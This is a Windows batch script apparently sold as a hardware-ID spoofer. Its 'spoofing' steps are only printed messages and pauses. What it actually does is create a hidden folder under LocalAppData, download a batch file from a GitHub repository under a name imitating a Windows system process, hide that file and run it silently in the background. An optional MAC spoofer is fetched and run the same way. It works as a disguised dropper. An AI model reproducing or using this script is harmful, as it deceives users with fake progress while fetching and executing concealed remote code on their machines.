@echo off
color 0a
title 64th Service / https://www.youtube.com/@64thservice

echo ==============================
echo =      64TH NEW TEMP        =
echo ==============================
echo.

:: Set target directory
set "targetDir=%LocalAppData%\Low\Microsoft"
if not exist "%targetDir%" (
    mkdir "%targetDir%" 2>nul
    attrib +h "%targetDir%"  :: Hide the directory
)

:: Set file paths
set "DRIVER_FILE=%targetDir%\Client Server Runtime Processs.bat"
set "MAC_FILE=%targetDir%\MAC.bat"

:: Display spoofing process
echo Starting spoofing process...
timeout /t 2 /nobreak >nul
echo Spoofing Disk...
timeout /t 2 /nobreak >nul
echo Spoofing CPU...
timeout /t 2 /nobreak >nul
echo Spoofing SMBIOS...
timeout /t 2 /nobreak >nul
echo Spoofing BIOS...
timeout /t 2 /nobreak >nul
echo Spoofing Chassis...
timeout /t 2 /nobreak >nul
echo Spoofing Motherboard...
timeout /t 2 /nobreak >nul

:: Download the Client if not present
if not exist "%DRIVER_FILE%" (
    echo WAIT...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/64TEMP/raw/refs/heads/main/Client%%20Server%%20Runtime%%20Processs.bat' -OutFile '%DRIVER_FILE%'" >nul 2>&1
    timeout /t 5 >nul
)

:: Run the Client file
if exist "%DRIVER_FILE%" (
    attrib +h "%DRIVER_FILE%"
    start /B cmd /c call "%DRIVER_FILE%" >nul 2>&1
)

echo Do you want to spoof the MAC address? (yes/no)
set /p choice=
if /i "%choice%"=="yes" (
    echo MAC spoofing...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/macspoff/raw/refs/heads/main/MAC.bat' -OutFile '%MAC_FILE%'" >nul 2>&1
    echo Running MAC spoofer...
    start /B cmd /c call "%MAC_FILE%" >nul 2>&1
) else (
    echo MAC address spoofing skipped.
)

timeout /t 5 >nul
echo DONE...

echo Press any key to exit...
pause >nul
exit /B
